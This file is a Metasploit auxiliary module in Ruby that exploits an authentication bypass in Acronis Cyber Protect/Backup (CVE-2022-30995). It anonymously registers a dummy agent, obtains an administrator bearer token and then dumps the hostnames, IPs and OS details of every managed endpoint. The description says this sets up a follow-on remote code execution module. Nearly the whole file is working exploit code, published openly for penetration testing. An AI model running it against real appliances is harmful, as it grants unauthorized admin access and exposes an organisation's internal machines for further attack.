##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::AcronisCyber

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Acronis Cyber Protect/Backup machine info disclosure',
        'Description' => %q{
          Acronis Cyber Protect or Backup is an enterprise backup/recovery solution for all,
          compute, storage and application resources. Businesses and Service Providers are using it
          to protect and backup all IT assets in their IT environment.
          This module exploits an authentication bypass vulnerability at the Acronis Cyber Protect
          appliance which, in its default configuration, allows the anonymous registration of new
          backup/protection agents on new endpoints. This API endpoint also generates bearer tokens
          which the agent then uses to authenticate to the appliance.
          As the management web console is running on the same port as the API for the agents, this
          bearer token is also valid for any actions on the web console. This allows an attacker
          with network access to the appliance to start the registration of a new agent, retrieve
          a bearer token that provides admin access to the available functions in the web console.

          This module will gather all machine info (endpoints) configured and managed by the appliance.
          This information can be used in a subsequent attack that exploits this vulnerability to
          execute arbitrary commands on both the managed endpoint and the appliance.
          This exploit is covered in another module `exploit/multi/acronis_cyber_protect_unauth_rce_cve_2022_3405`.

          Acronis Cyber Protect 15 (Windows, Linux) before build 29486 and
          Acronis Cyber Backup 12.5 (Windows, Linux) before build 16545 are vulnerable.
        },
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # Metasploit module
          'Sandro Tolksdorf of usd AG.'             # discovery
        ],
        'References' => [
          ['CVE', '2022-30995'],
          ['CVE', '2022-3405'],
          ['URL', 'https://herolab.usd.de/security-advisories/usd-2022-0008/'],
          ['URL', 'https://attackerkb.com/topics/27RudJXbN4/cve-2022-30995']
        ],
        'License' => MSF_LICENSE,
        'Privileged' => true,
        'DefaultOptions' => {
          'RPORT' => 9877,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION]
        }
      )
    )
    register_options(
      [
        OptString.new('TARGETURI', [true, 'The URI of the vulnerable Acronis Cyber Protect/Backup instance', '/']),
        OptEnum.new('OUTPUT', [true, 'Output format to use', 'table', ['table', 'json']])
      ]
    )
  end

  def check
    # initial check on api access
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'meta'),
      'ctype' => 'application/json'
    })
    return Exploit::CheckCode::Unknown('No Acronis API access found!') unless res&.code == 200 && res.body.include?('uri') && res.body.include?('method')

    # get first access token
    print_status('Retrieve the first access token.')
    @access_token1 = get_access_token1
    vprint_status("Extracted first access token: #{@access_token1}")
    return Exploit::CheckCode::Unknown('Retrieval of the first access token failed.') if @access_token1.nil?

    # register a dummy agent
    client_id = SecureRandom.uuid
    print_status('Register a dummy backup agent.')
    client_secret = dummy_agent_registration(client_id, @access_token1)
    return Exploit::CheckCode::Unknown('Registering a dummy agent failed.') if client_secret.nil?

    print_status('Dummy backup agent registration is successful.')

    # get second access_token
    print_status('Retrieve the second access token.')
    @access_token2 = get_access_token2(client_id, client_secret)
    vprint_status("Extracted second access token: #{@access_token2}")
    return Exploit::CheckCode::Unknown('Retrieval of the second  access token failed.') if @access_token2.nil?

    # get version info
    version = get_version_info(@access_token2)
    return Exploit::CheckCode::Unknown('Can not find any version information.') if version.nil?

    release = version.match(/(.+)\.(\d+)/)
    case release[1]
    when '15.0'
      if Rex::Version.new(version) < Rex::Version.new('15.0.29486')
        return Exploit::CheckCode::Appears("Acronis Cyber Protect/Backup #{version}")
      else
        return Exploit::CheckCode::Safe("Acronis Cyber Protect/Backup #{version}")
      end
    when '12.5'
      if Rex::Version.new(version) < Rex::Version.new('12.5.16545')
        return Exploit::CheckCode::Appears("Acronis Cyber Protect/Backup #{version}")
      else
        return Exploit::CheckCode::Safe("Acronis Cyber Protect/Backup #{version}")
      end
    else
      Exploit::CheckCode::Safe("Acronis Cyber Protect/Backup #{version}")
    end
  end

  def run
    # check if @access_token2 is already set as part of autocheck option
    if @access_token2.nil?
      # get first access token
      print_status('Retrieve the first access token.')
      @access_token1 = get_access_token1
      vprint_status("Extracted first access token: #{@access_token1}")
      fail_with(Failure::NoAccess, 'Retrieval of the first access token failed.') if @access_token1.nil?

      # register a dummy agent
      client_id = SecureRandom.uuid
      print_status('Register a dummy backup agent.')
      client_secret = dummy_agent_registration(client_id, @access_token1)
      fail_with(Failure::BadConfig, 'Registering a dummy agent failed.') if client_secret.nil?
      print_status('Dummy backup agent registration is successful.')

      # get second access_token
      print_status('Retrieve the second access token.')
      @access_token2 = get_access_token2(client_id, client_secret)
      vprint_status("Extracted second access token: #{@access_token2}")
      fail_with(Failure::NoAccess, 'Retrieval of the second access token failed.') if @access_token2.nil?
    end

    # report vulnerable instance
    report_web_vuln(
      web_site: normalize_uri(target_uri.path, 'api', 'ams', 'versions'),
      host: datastore['RHOSTS'],
      port: datastore['RPORT'],
      ssl: datastore['SSL'],
      method: 'POST',
      proof: "Authorization: Bearer #{@access_token2}",
      risk: 0,
      confidence: 100,
      category: 'admin token',
      description: 'Administrator token providing full web application accesss.',
      name: 'Acronis Cyber Protect/Backup administrator token'
    )
    # get all the managed endpoint configuration info
    print_status('Retrieve all managed endpoint configuration details registered at the Acronis Cyber Protect/Backup appliance.')
    res_json = get_machine_info(@access_token2)
    fail_with(Failure::NotFound, 'Can not find any configuration information.') if res_json.nil?

    # print all the managed endpoint information to the console
    if datastore['OUTPUT'] == 'table'
      print_status('List the managed endpoints registered at the Acronis Cyber Protect/Backup appliance.')
      res_json['data'].each do |item|
        next unless item['type'] == 'machine'

        print_status('----------------------------------------')
        print_good("hostId: #{item['hostId']}") unless item['hostId'].nil?
        print_good("parentId: #{item['parentId']}") unless item['parentId'].nil?
        print_good("key: #{item['id']}") unless item['id'].nil?
        print_status("type: #{item['type']}") unless item['type'].nil?
        print_status("hostname: #{item['title']}") unless item['title'].nil?
        print_status("IP: #{item.dig('ip', 0)}") unless item.dig('ip', 0).nil?
        print_status("OS: #{item['os']}") unless item['os'].nil?
        print_status("ARCH: #{item['osType']}") unless item['osType'].nil?
        print_status("ONLINE: #{item['online']}") unless item['online'].nil?
      end
    end
  end
end
